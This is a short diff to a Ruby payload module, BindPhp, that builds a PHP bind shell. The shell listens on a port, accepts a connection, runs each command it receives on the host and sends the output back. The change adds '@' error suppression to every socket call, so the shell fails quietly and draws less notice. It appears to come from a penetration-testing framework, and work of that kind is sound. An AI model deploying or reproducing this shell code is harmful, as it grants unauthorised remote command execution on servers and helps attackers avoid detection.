@@ -57,24 +57,24 @@ module BindPhp
 
 		$scl='socket_create_listen';
 		if(is_callable($scl)&&!in_array($scl,#{dis})){
-			$sock=$scl($port);
+			$sock=@$scl($port);
 		}else{
-			$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-			$ret=socket_bind($sock,0,$port);
-			$ret=socket_listen($sock,5);
+			$sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+			$ret=@socket_bind($sock,0,$port);
+			$ret=@socket_listen($sock,5);
 		}
-		$msgsock=socket_accept($sock);
-		socket_close($sock);
+		$msgsock=@socket_accept($sock);
+		@socket_close($sock);
 
-		while(FALSE!==socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
+		while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
 		{
 			
-			$c=socket_read($msgsock,2048,PHP_NORMAL_READ);
+			$c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
 			if(FALSE===$c){break;}
 			#{php_system_block({:cmd_varname=>"$c", :output_varname=>"$o", :disabled_varname => dis})}
-			socket_write($msgsock,$o,strlen($o));
+			@socket_write($msgsock,$o,strlen($o));
 		}
-		socket_close($msgsock);
+		@socket_close($msgsock);
 		END_OF_PHP_CODE
 		
 		return shell
